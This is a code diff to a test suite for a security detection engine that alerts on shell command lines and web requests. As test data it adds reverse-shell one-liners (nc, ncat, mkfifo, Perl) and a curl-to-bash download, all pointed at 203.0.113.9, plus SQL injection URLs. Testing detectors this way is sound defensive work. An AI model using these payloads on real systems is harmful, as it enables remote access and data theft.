@@ -69,10 +69,10 @@ def exec_alerts(engines, image, cmd, parent="", comm=""):
 _REQUEST = itertools.count(1)
 
 
-def web_matches(engines, path, referrer="-", status=200):
+def web_matches(engines, path, referrer="-", status=200, ip=None):
     dec, sig = engines
     n = next(_REQUEST)
-    ip = f"45.9.{n // 250}.{n % 250 + 1}"  # one IP per request: rule suppression would hide repeats
+    ip = ip or f"45.9.{n // 250}.{n % 250 + 1}"  # one IP per request: rule suppression would hide repeats
     line = (f'{ip} - - [20/Oct/2026:09:00:00 +0700] "GET {path} HTTP/1.1" {status} 150 "{referrer}" '
             '"Mozilla/5.0 (X11; Linux x86_64)"')
     event = dec.decode("nginx_access_combined", line)
@@ -96,6 +96,9 @@ def web_alerts(engines, path, referrer="-", status=200):
     ("echo dXNlcm5hbWVwYXNzd29yZDEyMzQ1 | base64", B64),
     ("echo YWRtaW46c3VwZXJzZWNyZXRwYXNz | base64 -d", B64),
     ("base64 -d backup.b64 | sha256sum", B64),
+    ("nc -zv db.internal 5432", REVERSE),                        # a port check
+    ("nc -w 3 mail.example.com 25", REVERSE),
+    ("curl -s https://example.com/install.sh -o install.sh && sha256sum install.sh", DOWNLOAD),
 ])
 def test_ordinary_command_lines_stay_quiet(engines, cmd, title):
     assert title not in cmdline_alerts(engines, cmd)
@@ -120,6 +123,16 @@ def test_ordinary_command_lines_stay_quiet(engines, cmd, title):
     ("base64 --decode /tmp/p.b64 | sh", B64),
     ("bash -c \"$(echo aWQ7dW5hbWUgLWE= | base64 -d)\"", B64),
     ("eval $(echo aWQ= | base64 -d)", B64),
+    # each of these slipped past an earlier draft of the tightened rules
+    ("sh -c 'nc 203.0.113.9 4444 -e sh'", REVERSE),
+    ("curl http://203.0.113.9/x|bash>/dev/null", DOWNLOAD),
+    ("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"203.0.113.9:4444\");"
+     "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'", PYSHELL),
+    # and these the original rules missed
+    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f", REVERSE),
+    ("nc.traditional -e /bin/sh 203.0.113.9 4444", REVERSE),
+    ("ncat --exec /bin/sh 203.0.113.9 4444", REVERSE),
+    ("ncat -c bash 203.0.113.9 4444", REVERSE),
 ])
 def test_attacks_still_fire(engines, cmd, title):
     assert title in cmdline_alerts(engines, cmd)
@@ -143,6 +156,12 @@ def test_plain_english_select_from_is_not_sql_injection(engines, path, referrer)
     "/item?id=-1+select+table_name+from+information_schema.tables",
     "/login?u=admin'--&q=select+password+from+users--",
     "/search?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
+    "/p?id=1+select+password+from+users",
+    "/p?id=-1+OR+1=1",
+    "/p?id=1'+OR+'1'='1",
+    "/p?id=1';WAITFOR+DELAY+'0:0:5'--",
+    "/p?id=1'+AND+1=CONVERT(int,(SELECT+@@version))--",
+    "/p?id=(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+0+END)",
 ])
 def test_sql_injection_still_fires(engines, path):
     assert SQLI in web_alerts(engines, path)
@@ -155,18 +174,34 @@ def test_web_servers_starting_a_shell_stay_critical(engines):
 
 @pytest.mark.parametrize("cmd", ["sh -c id", "/bin/sh -c curl http://203.0.113.9/x|sh"])
 def test_java_or_node_starting_a_shell_goes_to_triage_not_paging(engines, cmd):
+    # high: the AI analyst triages it at the default ai_min_severity (a JSP webshell
+    # or Confluence RCE looks like this); critical stays for real web servers
     for runtime in ("/usr/bin/java", "/usr/bin/node"):
         got = exec_alerts(engines, "/bin/sh", cmd, parent=runtime)
-        assert got.get(APP_SHELL) == "medium" and WEB_SHELL not in got, (runtime, got)
+        assert got.get(APP_SHELL) == "high" and WEB_SHELL not in got, (runtime, got)
+
+
+JENKINS_PIPELINE = ("sh -c ({ while [ -d '/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b' -a \\! -f "
+                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-result.txt' ]; do touch "
+                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-log.txt'; sleep 3; done } & "
+                    "jsc=durable-0a1b; JENKINS_SERVER_COOKIE=$jsc 'sh' -xe "
+                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/script.sh' > "
+                    "'/var/lib/jenkins/workspace/app@tmp/durable-5f2c9a1b/jenkins-log.txt' 2>&1; wait) >&- 2>&- &")
+
+
+@pytest.mark.parametrize("cmd", ["/bin/sh -xe /tmp/jenkins4512.sh", JENKINS_PIPELINE])
+def test_jenkins_build_steps_stay_quiet(engines, cmd):
+    got = exec_alerts(engines, "/bin/sh", cmd.replace('"', "'"), parent="/usr/bin/java")
+    assert APP_SHELL not in got and WEB_SHELL not in got, got
 
 
 @pytest.mark.parametrize("cmd", [
-    "sh -xe /var/lib/jenkins/workspace/app/script123.sh",
-    "/bin/sh -xe /tmp/jenkins4512.sh",
+    "sh -c curl http://203.0.113.9/x|sh; /tmp/jenkins1.sh",      # naming a jenkins file is not enough
+    "sh -xe /tmp/jenkins1.sh; id",
+    "sh -c id #@tmp/durable-5f2c9a1b",
 ])
-def test_jenkins_build_steps_stay_quiet(engines, cmd):
-    got = exec_alerts(engines, "/bin/sh", cmd, parent="/usr/bin/java")
-    assert APP_SHELL not in got and WEB_SHELL not in got, got
+def test_payloads_mentioning_jenkins_still_alert(engines, cmd):
+    assert exec_alerts(engines, "/bin/sh", cmd, parent="/usr/bin/java").get(APP_SHELL) == "high"
 
 
 @pytest.mark.parametrize("image", ["/tmp/go-build123/b001/exe/main", "/tmp/go-build998/b042/pkg.test"])
@@ -194,6 +229,17 @@ def test_a_payload_the_server_turned_away_is_one_level_lower(engines, path, titl
     for status in (404, 403, 400, 405, 429):
         m = web_matches(engines, path, status=status)[title]
         assert (m["level"], m["http_outcome"], m["http_status"]) == (lower, "rejected", status)
+
+
+def test_a_rejected_probe_does_not_mute_the_hit_that_follows(engines):
+    # a scanner's 404s, then the endpoint that answers 200, from one address within the
+    # rule's suppression window: the 200 must still alert at full level
+    ip = "45.10.0.7"
+    assert web_matches(engines, SQLI_PATH, status=404, ip=ip)[SQLI]["level"] == "medium"
+    assert SQLI not in web_matches(engines, SQLI_PATH, status=404, ip=ip)      # repeats stay suppressed
+    hit = web_matches(engines, SQLI_PATH, status=200, ip=ip)[SQLI]
+    assert hit["level"] == "high" and "http_outcome" not in hit
+    assert SQLI not in web_matches(engines, SQLI_PATH, status=200, ip=ip)
 
 
 def test_log4shell_keeps_its_level_on_a_404(engines):
